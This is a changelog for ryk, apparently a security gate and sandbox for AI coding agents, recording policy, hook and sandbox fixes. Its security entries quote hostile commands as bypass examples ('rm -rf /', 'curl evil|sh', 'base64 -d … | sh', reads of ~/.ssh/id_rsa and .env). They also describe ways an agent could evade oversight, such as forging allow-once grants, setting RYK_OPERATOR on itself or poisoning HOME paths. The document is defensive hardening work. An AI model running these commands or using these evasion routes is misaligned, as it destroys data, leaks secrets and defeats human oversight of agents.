# Changelog

## [0.2.19] - 2026-08-16

## What's Changed
* Put core_engine on the real test gates by @christopherkarani in https://github.com/christopherkarani/ryk/pull/140
* fix(opencode): show ryk host in vanilla OpenCode TUI by @christopherkarani in https://github.com/christopherkarani/ryk/pull/141
* Peel shell_eval into cwd, synth, and fm siblings by @christopherkarani in https://github.com/christopherkarani/ryk/pull/143
* fix(cli): expand env-node shebang so ryk pi survives OS sandbox attach by @christopherkarani in https://github.com/christopherkarani/ryk/pull/142
* fix(pi): stop TUI crashes on decision cards and sandbox mkdir EPERM by @christopherkarani in https://github.com/christopherkarani/ryk/pull/156
* fix(start): Claude smoke, probe smokes, leftover hosts by @christopherkarani in https://github.com/christopherkarani/ryk/pull/158
* fix(opencode): show TUI toast when ryk blocks a command by @christopherkarani in https://github.com/christopherkarani/ryk/pull/157
* fix(mcp): close notifications/ prefix fail-open in the policy proxy by @christopherkarani in https://github.com/christopherkarani/ryk/pull/160
* fix(agent-hook): fail closed on empty stdin for bare ryk by @christopherkarani in https://github.com/christopherkarani/ryk/pull/159
* fix: Windows doctor panic and ryk run AccessDenied (#147) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/148
* fix(security): ignore allow-once store unless OS sandbox is active by @christopherkarani in https://github.com/christopherkarani/ryk/pull/161
* fix(security): realpath-reject workspace-planted user allowlist.toml by @christopherkarani in https://github.com/christopherkarani/ryk/pull/151
* fix: deny force-equivalent git push on classify and shell_engine by @christopherkarani in https://github.com/christopherkarani/ryk/pull/152
* Expand hook host matrix to all 8 supported envelopes by @christopherkarani in https://github.com/christopherkarani/ryk/pull/162
* fix(cli): rebase #150 glanceable surface onto current main by @christopherkarani in https://github.com/christopherkarani/ryk/pull/163
* perf(hook): cheaper hot path without a 5ms SLA by @christopherkarani in https://github.com/christopherkarani/ryk/pull/164
* docs: real OpenCode deny GIF on the README hero by @christopherkarani in https://github.com/christopherkarani/ryk/pull/165
* fix(ryk-pi): borderless blocked-command cards (no untested Box) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/167
* fix: force-push Why points at fast-forward git push, not lease by @christopherkarani in https://github.com/christopherkarani/ryk/pull/178
* fix: launch Hermes under ryk; honor RYK_BIN/PATH source-build discovery by @christopherkarani in https://github.com/christopherkarani/ryk/pull/173
* fix(cli): override only top-level policy mode on ryk init by @christopherkarani in https://github.com/christopherkarani/ryk/pull/179
* perf: strip ReleaseSafe ryk and DCE product DebugAllocator by @christopherkarani in https://github.com/christopherkarani/ryk/pull/184
* chore: move Mac FM steward Swift source to ryk-fm-steward by @christopherkarani in https://github.com/christopherkarani/ryk/pull/183
* perf: gzip-embed oracle packs and inflate fail-closed by @christopherkarani in https://github.com/christopherkarani/ryk/pull/185
* fix(windows): open audit log for resync by @onatozmenn in https://github.com/christopherkarani/ryk/pull/186
* perf: slim PCRE2 without UCD and add -Dhttp TLS omit by @christopherkarani in https://github.com/christopherkarani/ryk/pull/188
* perf: split TUI barrel so -Dtui=false drops vaxis by @christopherkarani in https://github.com/christopherkarani/ryk/pull/187
* fix: unblock Linux CI gates and drop billed macOS runners by @christopherkarani in https://github.com/christopherkarani/ryk/pull/190
* fix(ux): say Session, not Always, for TTY ask (#146) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/191
* fix(hook): list grok in `ryk hook --help` by @christopherkarani in https://github.com/christopherkarani/ryk/pull/192
* fix: ryk start banner names written policy posture (#144) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/193
* refactor(cli): rename rust_visibility to feed_visibility by @christopherkarani in https://github.com/christopherkarani/ryk/pull/182
* docs: P4 binary-size measurement — flags-only, no ryk-dev split by @christopherkarani in https://github.com/christopherkarani/ryk/pull/189
* Add honest localhost Terminal view (supersedes #154) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/168

## New Contributors
* @onatozmenn made their first contribution in https://github.com/christopherkarani/ryk/pull/186

**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v0.2.18...v0.2.19

## [0.2.18] - 2026-08-14

## What's Changed
* fix: P0 security audit 2026-08-12 (shell truncation, allow-once, RYK_OPERATOR, audit redaction, hash-chain fork) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/129
* fix: P1 security audit 2026-08-12 (shim audit gap, hook fail-open, MCP passthrough, protection copy, telemetry opt-in, DNS rebind) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/130
* fix: close OS sandbox audit gaps by @christopherkarani in https://github.com/christopherkarani/ryk/pull/132
* fix: harden secret redaction boundaries by @christopherkarani in https://github.com/christopherkarani/ryk/pull/133
* fix(opencode): flat showToast for OpenCode 1.18 toast UI by @christopherkarani in https://github.com/christopherkarani/ryk/pull/127
* chore: repo hygiene Wave 0–1 by @christopherkarani in https://github.com/christopherkarani/ryk/pull/128
* docs: state Windows is wrapper/hook grade with no OS sandbox by @christopherkarani in https://github.com/christopherkarani/ryk/pull/137
* feat: sign release checksums and refuse unverifiable installs by @christopherkarani in https://github.com/christopherkarani/ryk/pull/136
* feat: make the Homebrew channel live (P2-2) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/135
* feat: Door A — eliminate coding-agent deadlocks (P2-1) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/134
* fix: close leftover 2026-08-12 audit medium-tail holes by @christopherkarani in https://github.com/christopherkarani/ryk/pull/138


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.17...v0.2.18

## [Unreleased]

### Changed

* **PCRE2 is a slim static build (binary-size P3).** Same 10.48 tarball (`@5a632d3`), but ryk no longer links upstream's `build.zig` artifact. `build/pcre2_slim.zig` compiles match/compile only with `SUPPORT_UNICODE=false` (UCD property tables dropped), JIT off, and DFA/substitute/convert/serialize/UTF helpers omitted. Pack patterns stay byte/POSIX; `\\p{…}` fails compile (fail closed). See `docs/dev/pcre2-slim.md`.
* **`-Dhttp=false` omits HTTP/TLS modules.** Default PATH and curl|sh builds stay HTTP-on (`-Dhttp` defaults true) so a token-present release still carries telemetry transport. Empty-token dry-run does not shrink that artifact. Slim profile drops `telemetry_transport.zig` and `provider_gateway.zig` (`std.http.Client` / TLS). Provider secrets on a slim binary fail closed. Linux default remains musl static + strip — not `x86_64-linux-gnu`.
* **Mac FM steward source moved** to [ryk-fm-steward](https://github.com/christopherkarani/ryk-fm-steward). ryk keeps `macos/fm-steward/Schemas` and the shell fixture cards as the wire contract. Zig still resolves `fm-steward` on `PATH` or `RYK_FM_STEWARD_BIN`. Assist only; fail-open and “never soften deny” are unchanged.

### Security

* **Force-equivalent git push stays denied on classify + shell_engine under generic-agent.** Shared detection covers `-f` / `--force*` / `--force=` / `--force-with-lease` / `--force-if-includes` / `+refspec` / `--delete` / `--mirror` / `:ref`, including `git -C` and short-opt clusters. Explain/TUI alternatives no longer recommend `--force-with-lease` as if it were allowed. Plain `git push` stays allowed.
* **Product evaluate ignores `allow_once.jsonl` unless the session OS sandbox is active.** Hook/run/shim used to always load `$XDG_DATA_HOME/ryk/allow_once.jsonl` (or `~/.local/share/ryk/allow_once.jsonl`). Redeem is TTY-bound (`ryk allow-once`), but consume is "read the JSONL" — a same-UID agent on a hook-only session (no OS sandbox) could append a well-formed grant and the next evaluate allowed. Product evaluate now sets `allow_once_path = null` unless the caller marks OS sandbox active (`ryk run` passes `requiresChildApply()`). Hook/shim do not infer active from a `$HOME` write-probe (an agent can point `HOME` at an unwritable path and plant the grant under `XDG_DATA_HOME`). Operator redeem/list/clear is unchanged.
* **User `allowlist.toml` rejects poisoned XDG/HOME.** Product evaluate realpaths both the workspace root and `XDG_CONFIG_HOME` / `HOME` before the under-root check (unresolved paths are treated as inside and skipped). After join, an existing `allowlist.toml` or its parent is realpath'd so `$XDG/ryk` (or the file) cannot be a symlink into the workspace. Poisoned XDG falls back to HOME only if HOME is outside the workspace; if both are poisoned the resolver returns null (no user store).

### Fixed

* **`ryk replay --tui` / `ryk history --live` on a pipe fall back to linear, not EXIT 2 (#217).** No colour TTY, `--plain`, `--no-rich`, or `NO_COLOR` prints a one-line `using linear report` note and continues as the linear command would. `--tui --json` and `--live --json` stay rejected (frozen machine output). Doctor already did this; default doctor stays linear. No new TUI.
* **`ryk hook --help` documents that Pi is not a hook host.** Usage stays the six `Host.parse` hosts (`codex|claude|grok|opencode|openclaw|hermes`). Pi remains a launch alias and uses `ryk evaluate` / the bundled extension. Cursor is still not a hook host. The lock test now requires that honesty line and rejects `ryk hook pi`.
* **Dashboard GET `/terminal/` is a directory index.** `formatListenUrl` prints `http://127.0.0.1:7742/terminal/`; a single trailing slash now maps to the `terminal` prefix (then `terminal/index.html` / SPA fallback) instead of failing `isSafeStaticPath` as an empty segment. Sibling trailing-slash views (`/activity/`) share the helper. `//`, `/terminal//`, and `..` still 404.
* **`ryk start` banner names the written policy posture.** Default create still seeds generic-agent / DCG `mode: strict`. The setup-path line and first-run receipt now say `strict` (or `Ask` when the YAML is ask) instead of a hardcoded “Ask on risk (auto)”. Quiet success, one next action, no box-drawing walls. install ≠ start.
* **`ryk hook --help` lists grok.** Dispatch already accepted `ryk hook grok`; the usage host list was a stale subset (`codex|claude|opencode|openclaw|hermes`). Help now matches `Host.parse`, and a lock test keeps the Usage group aligned with that allowlist. Pi stays on `evaluate`; cursor is not a hook host.
* **Deny/ask copy no longer says Always for session sticky (#146).** The TTY prompt is Once / Session / Never. Session is in-memory for this ryk process; it is not a permanent allowlist write. Host-UI allow stays quiet and is not described as a ryk sticky write (A5). `ryk test` / `ryk explain` name the rule and a safer command on deny. Sticky semantics, fail-closed empty stdin, and allow-once are unchanged.
* **Windows `ryk run` reaches child launch again.** New session audit logs now open with the read access required by Windows handle metadata queries, so EOF resynchronization no longer fails with `AccessDenied` before shim installation.
* **`ryk explain` / `ryk test` force-push Why no longer recommends `--force-with-lease`.** Pack reasons for `core.git:push-force-long` and `push-force-short` now point at a fast-forward `git push`. `--force-with-lease` stays force-equivalent and denied. Deny of `--force`, `-f`, lease, `--force-if-includes`, `+refspec`, `--delete`, `--mirror`, and `:ref` is unchanged.
* **Bare `ryk` empty/whitespace stdin on a non-TTY hook entry is fail-closed.** `src/cli/mod.zig` used to map `agent_hook.command`'s blank stdin (`NotAgentHookInput`) to help + exit 0. Hosts that treat exit 0 / non-JSON as allow skipped the gate. Empty and whitespace-only stdin now emit dual-contract deny JSON and exit 2. A failed stdin TTY probe enters hook mode (same deny path) instead of help. Interactive TTY with no args still shows help. This is the bare `ryk` stdin hook entry only — not `ryk hook <host>`.
* **`ryk start` no longer fails a working setup for expected host leftovers.** Claude install smoke now reads the live `permissionDecision` JSON (deny is a pass; ask is not). Cursor deferred and an unowned Pi extension are skips, not hard failures. Install/doctor hook probes pass `--probe` so they evaluate as usual but do not mint allow-once redeem codes onto the operator TTY.
* **`ryk pi` launch under OS sandbox:** `#!/usr/bin/env node` host scripts (Pi, npm-global agents) no longer die with `ryk shim exec: real command not found after removing shim path: node`. After attach, PATH honesty drops Homebrew and Seatbelt no-bare-home EPERMs `~/.local` / nvm / Hermes node, so the session `node` shim cannot resolve a real interpreter. The product path now expands env shebangs to absolute interpreter + script before spawn (same rewrite Codex MCP already used). Host MCP plans that keep bare `pi` are included.
* **Pi exits on ryk block/ask cards (`child.render is not a function`).** The `rykanv-decision` message renderer returned a themed string. Pi's `CustomMessageComponent` treats a truthy return as a TUI child and calls `.render()`, so the session died as soon as a decision card was sent (for example `cat .env`). The renderer now returns a `{ render(width) }` component. Reinstall the Pi extension (`ryk doctor --fix`) so `~/.pi/agent/extensions/ryk/runtime.ts` is replaced.
* **Pi exits at session start with `EPERM` mkdir on `~/.local/state/ryk/pi-ask/...`.** Under the OS sandbox, parent-ask IPC cannot create its HOME state dir. That `mkdirSync` was uncaught and killed Pi before any tool ran. mkdir is now best-effort; parent-ask degrades (subagent asks still fail closed) and the TUI stays up.

### Added

* **Local Terminal view for blocked commands.** `ryk dashboard --view terminal` and the thin alias `ryk cloud` open the localhost dashboard (port 7742) on a blocked-command stream of real `blocked_actions`. An empty feed stays empty. `--demo` / `?demo=1` / Load demo are the only fixture paths, and that chrome is labeled DEMO / fixture. `ryk cloud` is documented on `ryk help --all` and `ryk cloud --help` only — default `ryk` / `ryk help` do not teach a new cloud verb. Not a hosted control plane; install does not start this UI.
* **Release signing is wired but not yet active.** `keys/ryk-release-minisign.pub` ships the sentinel `RYK_RELEASE_PUBKEY_UNPROVISIONED`. Until a real key is provisioned, `scripts/install.sh` reports signing is not yet active and continues on SHA-256 only (checksum-only / fail-open). `scripts/install.ps1` is checksum-only (Windows unsigned) and does not verify `checksums.txt.minisig`. After provisioning, the POSIX installer will verify a detached minisign signature over `checksums.txt` and refuse unverifiable releases. `cut-release.sh` has a `sign` phase before `publish-git`; after a dry-run, resume from `sign`, not `publish-git`. CI backup (`release.yml`) still does not attach `checksums.txt.minisig`. See `docs/release-signing.md`.
* **Homebrew formula is ready; the public tap is not published yet.** `packaging/homebrew/Formula/ryk.rb` is a real formula (release URLs, per-platform SHA-256 digests, caveats that point at `ryk doctor --fix`, `brew test`). `christopherkarani/homebrew-ryk` is 404 — do not `brew tap christopherkarani/ryk` until that repo exists. The checksum-verified curl installer remains the working public path on macOS and Linux. See `docs/install.md`.

### Changed

* **Hook hot path is cheaper; not a 5ms SLA.** Host hook processes now parse the four default oracle packs (`core.*` + `system.disk`), compile PCRE on first keyword-gated match, and skip regex compile when a required prefix literal cannot appear **and** the pattern has no depth-0 `|` after that prefix (skipping a destructive compile is an allow if nothing else hits). Informational events skip the rest of policy evaluation, but Codex still discovers policy so a broken workspace file fails closed (exit 2 + sentinel) instead of allow. Extra packs still upgrade via `ensureForMatchOptions` when `pack_config` enables them. Pack JSON is scanned only when the object is compact `"id"`-first; otherwise the object is fully parsed (fail closed on error). Any millisecond numbers are ReleaseFast + warm page cache + default packs + one runner — an aspirational budget, not a cross-host guarantee. FM soft seatbelt, dashboard feed writes (including fsync), and non-hook telemetry stay on; turning those off would change decisions or operator visibility.
* **Windows positioning:** public docs and `ryk doctor` now match backend truth. Windows sessions have no OS sandbox and run at wrapper/hook grade (MCP stdio is proxy). Doctor reports cmd/PowerShell wrappers as wrapper-only, and transparent filesystem plus proxy-mediated HTTP as unavailable (no loopback proxy). WinGet and Scoop stay deferred pending a Windows story (decision 2026-08-13).
* **Homebrew formula is real, not a template.** `packaging/homebrew/Formula/ryk.rb` carries published release URLs and per-platform SHA-256 digests, caveats that point at `ryk doctor`, and a `brew test` block. `scripts/cut-release.sh` gained a `publish-brew` phase that regenerates the formula from the release's `checksums.txt`. A missing tap is a preflight warning and skips `--live` tap push rather than surprising after publish-git. The bump phase does not write a version-only formula (old digests). `brew upgrade` replaces the binary only; `ryk doctor --fix` wires hosts. `scripts/update-homebrew-tap.sh` fails closed (writes nothing) on a missing or malformed digest, a missing marker, missing ruby, or a `--live` tap clone failure.
* **Packaging channel decisions recorded** in `packaging/README.md`: Homebrew ready / tap not published yet (blocked), npm deferred until a demand trigger fires, WinGet and Scoop deferred pending a Windows story. Nothing new is published.

### Door A — deadlock-free coding sessions (P2-1)

* **Stale default policies migrate (P2-1a):** install and `ryk doctor --fix` seeded `policy.yaml` create-only, so an existing install kept whatever default shipped the day it was set up and new defaults only helped new installs. A policy byte-identical to any previously shipped generic-agent default is now replaced with the current default on `ryk doctor --fix` / install ensure (not `ryk start`), with the previous file kept alongside as `.bak`. Migration refuses a symlink `.ryk` or `policy.yaml` and re-hashes the dest immediately before rename. A customized policy is never rewritten — `ryk doctor` names it in a new "Policy freshness" section and points at the preset for a manual comparison. An unparseable policy is left untouched and reported (ryk already fails closed on it). After `ryk doctor --fix`, a pristine old default is seeded to generic-agent.
* **Package and push flows no longer deadlock (P2-1b):** the command risk heuristic gated `npm install`, `pip install`, and plain `git push` implicitly. Because it resolves to **deny** under `mode: strict`, the coding default hard-denied ordinary package and push work on the decide surface while the shell-hook surface allowed it — a split-brain that stalled agents. Those three routine patterns were removed from the heuristic, so the coding default's own `commands.default: allow` is honoured. Presets that want approval keep explicit `commands.ask` rules. Force-equivalent git push (`-f`, `+refspec`, `--delete`, `--mirror`, `:ref`) stays denied on the YAML heuristic and the command + shell-engine fence — not a claim of critical deny on every host.
* **Network-fetch and opaque-decode pipes fenced code-side (P2-1b):** `curl … | sh`, `wget -qO- … | bash`, and `base64 -d … | sh` (including `sudo`/`env`/`command`/`nice` wrappers on either side of `|`) are now denied at critical by the shell engine regardless of pack coverage — command + shell-engine + pipe-to-executor, not a claim of critical deny on every host.
* **Short block message parity across hosts (P2-1c):** a cross-host test now replays one real pack deny through every host's production wire shape (Codex, Claude, Grok, OpenCode, OpenClaw, Hermes) and holds the agent-visible field to one line with no operator wall and no redeemable allow-once code. Codex and Grok are honest exceptions on channel: having no second surface the model can read, they carry recourse as a fixed `<code>` placeholder.
* **OpenCode toast on the release path (P2-1c):** the flat `showToast` call for OpenCode 1.18 and the quiet default (no red `console.error` status line on blocks) are now on the packaged drop-in plugin, not only on a branch.
* **`ryk doctor --deadlock-check` (P2-1d):** replays a standard coding workflow against the active policy and exits nonzero when a normal step would ask/deny (an agent would stall) or a dangerous step would be allowed. Read-only; shares both the workflow corpus with the regression replay test and the policy-plus-pack precedence with the decide surface, so it cannot drift from what a live session does.

**User-visible behavior changes:** a pristine old default policy is upgraded in place on the next `ryk doctor --fix` / install ensure (backup written alongside; `ryk start` does not migrate); `ryk doctor` may print a Policy freshness notice; under the coding default `npm install`, `pip install`, and plain `git push` now run without approval (force-equivalent push and pipe-to-executor stay denied on the command + shell-engine fence); `ryk doctor --deadlock-check` is new.

### Security (audit medium tail 2026-08-12)

* **Command deny globs ignore padding:** `commands.deny` patterns collapse extra spaces/tabs and strip a leading `./` / `.//` on each word before matching, so `cat  ~/.ssh/id_rsa` and `cat ./.env` no longer slip past preset denies such as `cat .env` and `cat ~/.ssh/*`. Normalize overflow fails closed (deny), not as a miss. This is matcher-local whitespace + leading `./`; it is not shell-engine parity.
* **Shell effect classification is exhaustive:** `curl`/`wget`/`open` bypass classifiers tokenize the full command instead of silently dropping tokens after 48, so a long header list cannot hide a `comms.publish` URL. `curl --url=` / `-url=` are treated as transfer URLs so `comms.publish` still fires.
* **Audit redactor covers more secret shapes:** standard base64 values that contain `/` no longer skip the entropy heuristic; compact JWTs (4+ character parts, `eyJ` header) and shorter provider prefixes (`ghp_` / `sk-` at 12+ characters) are classified; query-embedded forms of those fixtures are redacted. Path-shaped strings, `sk-learn`, and dotted rule ids (`files.read.deny`) stay unredacted. URL userinfo (`scheme://user:pw@host`) was already closed.
* **MCP Always-this-session lasts for the proxy process:** `ryk mcp proxy` keeps an "always / session" approval for its lifetime for the same JSON-RPC method + canonical args. Once still applies to a single call; `ask` is never treated as allow. Stringify overflow is not stored as a shared `args=[arguments omitted]` Always key.
* **Session-end audit chain hash:** `ryk run` prints `Audit chain: <sha256>` when the session ends. `ryk mcp proxy` prints `ryk mcp proxy: audit chain <sha256>` on stderr. The same value is stored as `final_event_hash` in `summary.json` / `summary.md`. The printed hash is a copy-out-of-band convenience, not an integrity guarantee; a local rewrite of both the event log and the summary remains out of scope.
* **Dashboard feed session_id:** crafted `session_id` (and `workspace_root`) values with `..` or extra separators are skipped before any filesystem join. This is a loader skip (degraded health), not a fail-closed policy deny.

### Security (OS sandbox audit 2026-08-13)

* **Landlock truncation integrity:** Linux OS-enforced sessions now require Landlock ABI 3+; ABI 1/2 degrade or fail closed because they do not mediate `truncate(2)` and `open(O_TRUNC)`. Doctor reports the probed ABI and gap.
* **Linux FUSE profile parity:** the protect-on bootstrap protocol now carries every parent launch grant class, including read-only and host-config paths, so child profile reconstruction and attestation hashes remain identical.
* **Canonical host-config grants:** existing host-config and ancestor-instruction paths are canonicalized and revalidated, preventing symlink retargets into secret trees or outside approved roots.
* **Live backend requirements:** `--require-backend strong-sandbox` now accepts a planned OS attach, while `landlock` specifically requires a Landlock plan; child attach failures still abort launch.
* **Verified descriptor scrub:** sandbox child handshakes fail closed unless inherited-FD cleanup is verified after the fallback path.
* **Honest network evidence:** macOS route-forced banners and audit posture now state that UDP/QUIC remains unrestricted.
* **Trustworthy stress probes:** mediated stress tests use a trusted host fixture outside the workspace, retain a workspace-plant anti-spoof check, and assert `strong-mediated` evidence on deny probes.
* **Pre-opened stdio residual:** credentials and platform docs now explain that inherited FDs 0/1/2 can retain access outside filesystem path grants.

### Security (P0 audit 2026-08-12)

* **Shell comment truncation bypass (P0-1):** `#` is now treated as a comment only when it starts a word (POSIX), so `echo safe#; rm -rf /` no longer truncates evaluation to `echo safe`, and command substitutions glued after `#` (`echo x#$(curl evil|sh)`) are still extracted and evaluated. Segmentation also always evaluates the full original line when it yields a single candidate.
* **Allow-once self-service bypass (P0-2):** `pending_exceptions.jsonl` now stores only a keyed SHA-256 hash of the redeem code (schema v2); the plaintext code is memory-only and shown solely on the operator's controlling terminal, never in agent-visible output or on disk. Legacy plaintext (v1) rows fail closed on read. The pending/allow-once directory is hardened to `0700` (files remain `0600`). `ryk allow-once *` was removed from the default and strict-preset permit lists so an agent cannot invoke redeem as an allowed command.
* **`RYK_OPERATOR` removed as an auth signal (P0-3):** operator-only paths (allow-once redeem, allowlist mutations, baseline pack disable) now require an interactive controlling TTY and fail closed otherwise. The `RYK_OPERATOR` environment variable is gone — it authenticated nobody, since a child process can set it on itself.
* **Audit write-path redaction hardened (P0-4):** the bounded, alloc-free redactor used by the hash-chain and summary writers now runs the structured sensitive-key scan (and URL userinfo detection), matching `redactAlloc`. Structured secrets such as `{"password":"…"}`, `Authorization: Bearer …`, and `mysql://user:pw@host` are now redacted in `events.jsonl`, `summary.json`, `summary.md`, and `ryk replay` output. Redaction is idempotent over existing `[REDACTED…]` markers.
* **Audit hash chain fork under interleaved writers (P0-5):** the session writer re-syncs the chain tip from disk before an append when the events file grew underneath it (a shim appended), and writes positionally at the true end of file instead of the process-global seek offset. Interleaved parent/shim/parent appends now verify clean under `ryk replay`, while any mid-chain edit still fails verification.

**User-visible behavior changes:** `RYK_OPERATOR` no longer authorizes anything (use an interactive terminal); `ryk allow-once *` is no longer auto-allowed by the default policy; the allow-once redeem code is shown only on the operator terminal.

### Security (P1 audit 2026-08-12)

* **Shim unaudited-exec gap closed (P1-1):** when the session audit open fails, the PATH shim now probes the control root to distinguish the by-design Seatbelt/Landlock write-deny residual from audit-file tamper. Tamper-shaped failures (e.g. `chmod 000 events.jsonl` with a writable control root) now **fail closed** — the allowed exec is denied rather than run with no audit record. Genuine residuals drop a workspace gap marker; the parent appends an `audit_degraded` event at session end (also for parent-attested degraded sessions), and `ryk replay` / `ryk doctor` surface degraded sessions.
* **Cursor/agent hook fails closed (P1-2):** the bare-`ryk` stdin hook (`beforeShellExecution` / Claude-compatible entries) no longer fails open on malformed JSON, oversized payloads, unknown formats, or command-less shell payloads — they emit dual-contract deny JSON and exit 2 (the host block code). Recognized non-shell tool hooks still pass through.
* **MCP proxy deny-default (P1-3):** unknown, vendor-namespaced, or side-effecting MCP methods (`completion/complete`, `logging/setLevel`, `vendor/*`, future spec methods) are denied and audited instead of forwarded unmediated. Only `initialize`, `ping`, `notifications/*`, `tools/list`, `resources/list`, and `prompts/list` pass ungated; see `docs/mcp.md`.
* **Honest setup completion copy (P1-4):** `ryk start` no longer prints "You're now protected by ryk" after hook-only verification. The end card states what was verified (protection grade: hook), that setup attaches no OS sandbox, and points at the session banner (`RYK_SESSION_SANDBOX_GRADE`) and `docs/compatibility.md`.
* **Telemetry is opt-in (P1-5):** missing consent state now means disabled — nothing is queued or sent until `ryk telemetry enable`. `RYK_NO_TELEMETRY=1` remains a hard off that overrides even explicit opt-in. The payload contract (fixed allowlist, `$ip:0`, no person profile) is unchanged.
* **Intercept proxy DNS-rebinding fence (P1-6):** after a hostname passes policy, the proxy re-checks every resolved address and pins the validated one (no re-resolution). Loopback, private, link-local, and cloud-metadata answers are refused unless `network.allow` explicitly lists the class (`localhost`, `private`, `metadata`) or exact IP; the attempt is denied with a `network_connect_denied` audit event and a 403 to the client.

**User-visible behavior changes:** telemetry is now opt-in (`ryk telemetry enable`); `ryk start` completion copy states the verified grade instead of an absolute protection claim; the MCP proxy denies unknown methods (previously forwarded); the Cursor/agent hook denies malformed payloads (previously silent permit); shim execs with a tamper-shaped audit log are denied; degraded-audit sessions are visible in `ryk replay` and `ryk doctor`.

## [1.2.17] - 2026-08-12

## What's Changed
* fix(opencode): find product ryk under HOME + short toast path by @christopherkarani in https://github.com/christopherkarani/ryk/pull/125
* fix(install): seed user policy so agents work after curl install by @christopherkarani in https://github.com/christopherkarani/ryk/pull/126


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.16...v1.2.17

## [1.2.16] - 2026-08-11

## What's Changed
* fix(plugin): upgrade managed OpenCode plugins on update/install by @christopherkarani in https://github.com/christopherkarani/ryk/pull/123


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.15...v1.2.16

## [1.2.15] - 2026-08-11

## What's Changed
* fix(opencode-plugin): toast + short tool line on hard block by @christopherkarani in https://github.com/christopherkarani/ryk/pull/117
* fix(hook): short agent-facing message without Recourse wall by @christopherkarani in https://github.com/christopherkarani/ryk/pull/118
* feat(hook): Claude host-shaped deny via permissionDecision by @christopherkarani in https://github.com/christopherkarani/ryk/pull/119
* fix(hermes): one-line host block/approve message without remediation walls by @christopherkarani in https://github.com/christopherkarani/ryk/pull/120
* fix(hosts): OpenCode permission deny toast + Pi notify on hard deny by @christopherkarani in https://github.com/christopherkarani/ryk/pull/121
* fix(pi): short agent block reason with one structured Next by @christopherkarani in https://github.com/christopherkarani/ryk/pull/122


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.14...v1.2.15

## [1.2.14] - 2026-08-11

## What's Changed
* feat(cli): day-one install reliability + coding-agent DCG defaults by @christopherkarani in https://github.com/christopherkarani/ryk/pull/116


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.13...v1.2.14

## [1.2.13] - 2026-08-10

## What's Changed
* feat(agents): unattended Hermes/OpenClaw setup and health by @christopherkarani in https://github.com/christopherkarani/ryk/pull/115


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.12...v1.2.13

## [1.2.12] - 2026-08-08

**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.11...v1.2.12

## [1.2.11] - 2026-08-08

## What's Changed
* Fix release resume state quoting by @christopherkarani in https://github.com/christopherkarani/ryk/pull/114


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.10...v1.2.11

## [1.2.10] - 2026-08-08

## What's Changed
* harden sandbox and secret-boundary enforcement across macOS and Linux
* add agent-inference policy discovery and CLI onboarding improvements
* add verified CLI documentation and PostHog product telemetry
* make the checksum-verified curl installer the only active release channel

**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.9...v1.2.10

## Formerly Orca

The product was previously named Orca.

## [1.2.9] - 2026-07-25

## What's Changed
* feat: proxy daemon CLI and surface shell deny remediation by @christopherkarani in https://github.com/christopherkarani/ryk/pull/48
* feat(cli): P0 one-product UX (start, deny, doctor, help) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/49
* feat(cli): P2a power baseline — packs productized + orca status by @christopherkarani in https://github.com/christopherkarani/ryk/pull/50
* feat(cli): mode×severity shell matrix and day-2 policy loop (P2b) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/51
* fix: harden dashboard, redaction, and host integrations by @christopherkarani in https://github.com/christopherkarani/ryk/pull/52
* feat(cli): readiness contracts, daemon hardening, and OpenClaw honesty by @christopherkarani in https://github.com/christopherkarani/ryk/pull/53
* fix: close residual PR #53 security risks by @christopherkarani in https://github.com/christopherkarani/ryk/pull/54
* feat(install): polish curl|sh installer UX with step receipt by @christopherkarani in https://github.com/christopherkarani/ryk/pull/55
* feat(policy): effect-class semantic intent for host and MCP tools by @christopherkarani in https://github.com/christopherkarani/ryk/pull/56
* feat(policy): Phase B structural args, network tags, and shell effect merge by @christopherkarani in https://github.com/christopherkarani/ryk/pull/57
* feat(policy): Phase C user effect packs and tools discovery by @christopherkarani in https://github.com/christopherkarani/ryk/pull/58
* fix(policy): address PR #57 review gaps on proxy and shell classifiers by @christopherkarani in https://github.com/christopherkarani/ryk/pull/59
* feat(policy): Phase D local residual effect classifier by @christopherkarani in https://github.com/christopherkarani/ryk/pull/61
* feat(security): OS filesystem sandbox for orca run (Landlock + Seatbelt) by @christopherkarani in https://github.com/christopherkarani/ryk/pull/63
* feat(cli): viral Safe Launch surface for agent operators by @christopherkarani in https://github.com/christopherkarani/ryk/pull/64
* feat: add Phase 2 network route forcing by @christopherkarani in https://github.com/christopherkarani/ryk/pull/65
* refactor(orca-rs): remove orphan CLI surface and dead guard APIs by @christopherkarani in https://github.com/christopherkarani/ryk/pull/66
* feat: Zig shell_engine sole Evaluate authority; static PCRE2 by @christopherkarani in https://github.com/christopherkarani/ryk/pull/67
* chore(scripts): drop dead daemon stubs and orca-rs gate paths by @christopherkarani in https://github.com/christopherkarani/ryk/pull/68
* feat(shell_engine): Phase 1 hard fence — pack order + structure smart checks by @christopherkarani in https://github.com/christopherkarani/ryk/pull/69
* feat(policy): Phase 2 YOLO/Strict modes and session sticky trust by @christopherkarani in https://github.com/christopherkarani/ryk/pull/70
* feat(fm-steward): Phase 3 Mac risk-card steward with timeout fallback by @christopherkarani in https://github.com/christopherkarani/ryk/pull/71
* feat(fm-steward): wire real on-device SystemLanguageModel by @christopherkarani in https://github.com/christopherkarani/ryk/pull/72
* feat(fm-steward): residual attach surface + soft-edge integrity by @christopherkarani in https://github.com/christopherkarani/ryk/pull/73
* feat(hooks): Phase 4 wire FM steward into product shell paths by @christopherkarani in https://github.com/christopherkarani/ryk/pull/74
